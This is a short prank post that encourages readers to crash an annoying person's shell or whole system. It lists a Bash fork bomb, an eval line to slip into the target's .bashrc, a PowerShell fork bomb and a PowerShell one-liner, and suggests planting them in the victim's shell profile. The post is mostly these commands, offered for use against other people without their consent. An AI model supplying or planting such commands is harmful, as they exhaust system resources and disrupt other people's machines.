# Crash your shell
*2019-3-14*

Is someone annoying you? Crash their shell with just a few lines of code.

### Usage
Try adding these commands to the shell's profile. :laughing:

#### Bash
Just add this to their [`.bashrc`] <sup>[1]</sup>:
```bash
eval "$BASH_COMMAND"
```
Or even their whole system:
```bash
:(){ :|:& };:
```

#### PowerShell 5
```powershell
$? = True
```

#### PowerShell 6
```
function i { i|i& };i
```

More coming soon.

---
### Notes
1. See https://github.com/dylanaraps/blag/blob/master/src/future/breaking-bash.md
